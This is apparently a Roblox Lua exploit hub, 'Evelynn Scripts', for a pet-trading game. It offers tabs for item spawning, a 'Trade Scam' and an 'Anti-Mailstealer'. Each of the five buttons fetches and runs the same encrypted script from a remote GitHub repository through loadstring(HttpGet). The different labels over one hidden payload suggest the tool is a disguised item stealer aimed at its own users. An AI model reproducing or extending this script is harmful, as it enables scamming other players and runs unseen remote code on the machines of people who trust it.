local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Evelynn Scripts",
   Icon = 0, 
   LoadingTitle = "Evelynn Scripts",
   LoadingSubtitle = "by Evelynn",
   Theme = "Default", 
   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, 

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, 
      FileName = "Evelynn Hub"
   },

   Discord = {
      Enabled = true, 
      Invite = "https://discord.gg/w7D4W4j27j",
      RememberJoins = true 
   },

   KeySystem = false, 
   KeySettings = {
      Title = "Evelynn Key System",
      Subtitle = "One time key system",
      Note = "Join Discord To Get Key!",
      FileName = "Key", 
      SaveKey = true, 
      GrabKeyFromSite = false, 
      Key = {"key2025"}
   }
})

-- Create Tabs and Buttons within those Tabs

-- Huge Hunter Tab
local Section1 = Window:CreateTab("Huge Hunter")
local Button1 = Section1:CreateButton({
   Name = "Load Huge Hunter",
   Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
      print("Thanks For Using Evelynn Scripts - Huge Hunter")
   end,
})

-- Gem Spawner Tab
local Section2 = Window:CreateTab("Gem Spawner")
local Button2 = Section2:CreateButton({
   Name = "Load Gem Spawner",
   Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
      print("Thanks For Using Evelynn Scripts - Gem Spawner")
   end,
})

-- Pet Spawner Tab
local Section3 = Window:CreateTab("Pet Spawner")
local Button3 = Section3:CreateButton({
   Name = "Load Pet Spawner",
   Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
      print("Thanks For Using Evelynn Scripts - Pet Spawner")
   end,
})

-- Trade Scam Tab
local Section4 = Window:CreateTab("Trade Scam")
local Button4 = Section4:CreateButton({
   Name = "Load Trade Scam",
   Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
      print("Thanks For Using Evelynn Scripts - Trade Scam")
   end,
})

-- Anti-Mailstealer Tab
local Section5 = Window:CreateTab("Anti Mailstealer")
local Button5 = Section5:CreateButton({
   Name = "Save Anti-Mailstealer to executor",
   Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/refs/heads/main/ps99-encrypted/Evelynn_Scripts"))()
      print("Thanks For Using Evelynn Scripts - Anti-Mailstealer")
   end,
})
